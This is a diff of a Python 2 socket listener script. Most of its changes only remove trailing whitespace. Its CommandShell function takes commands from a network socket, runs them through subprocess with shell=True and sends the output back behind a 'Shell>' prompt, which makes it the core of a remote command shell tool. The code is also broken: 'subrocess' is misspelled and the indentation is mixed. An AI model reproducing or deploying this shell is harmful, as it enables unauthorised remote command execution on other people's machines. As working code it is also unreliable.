@@ -9,7 +9,7 @@ def sockListen():
 	global host
 	global port
 	global s
-	
+
 	CORE_STRING  = colored("[listener]", 'blue')
 	host = ''
 	port = int(raw_input(CORE_STRING + " Port Number> "))
@@ -29,33 +29,33 @@ def sockListen():
 def sockAccept():
 	global s
 	global CORE_STRING
-	
+
 	try:
 		while True:
 			conn, addr = s.accept()
-			print CORE_STRING + "Connection With: " + str(addr[0]) + ":" + str(addr[1]) 
-       			break 
+			print CORE_STRING + "Connection With: " + str(addr[0]) + ":" + str(addr[1])
+                        s.recv(6000)
 
 	except socket.error as w:
 		cprint(str(w), 'red')
 
 	except KeyboardInterrupt as y:
 		cprint(str(y), 'red')
-		sys.exit(0) 
-	
+		sys.exit(0)
+
 	except:
-		pass 
+		pass
 
 def CommandShell():
 	data = s.recv(1024)
 
 	if data.strip() == "exit":
-		sys.exit(0) 
-	
-	PROC = subrocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-	OUTPUT = PROC.stdout.read() + PROC.stderr.read() 
-	s.send(OUTPUT)
-	s.send("Shell> ") 
-	
+		sys.exit(0)
 
-		
+	PROC = subrocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	OUTPUT = PROC.stdout.read() + PROC.stderr.read()
+	s.send(OUTPUT)
+	s.send("Shell> ")
+
+
+
